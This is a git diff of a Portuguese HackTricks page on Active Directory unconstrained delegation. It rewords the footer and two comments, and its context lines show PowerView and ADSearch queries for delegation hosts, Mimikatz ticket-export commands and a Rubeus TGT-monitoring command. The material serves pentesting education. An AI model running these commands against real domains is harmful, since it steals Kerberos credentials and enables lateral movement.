@@ -9,7 +9,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 <summary>Support HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
-* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos no** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
@@ -30,8 +30,8 @@ Get-NetComputer -Unconstrained #DCs sempre aparecem, mas não são úteis para p
 </strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 <strong># Exportar tickets com Mimikatz
 </strong>privilege::debug
-sekurlsa::tickets /export #Forma recomendada
-kerberos::list /export #Outra forma
+sekurlsa::tickets /export #Método recomendado
+kerberos::list /export #Outro método
 
 # Monitorar logins e exportar novos tickets
 .\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verifique a cada 10s por novos TGTs</code></pre>
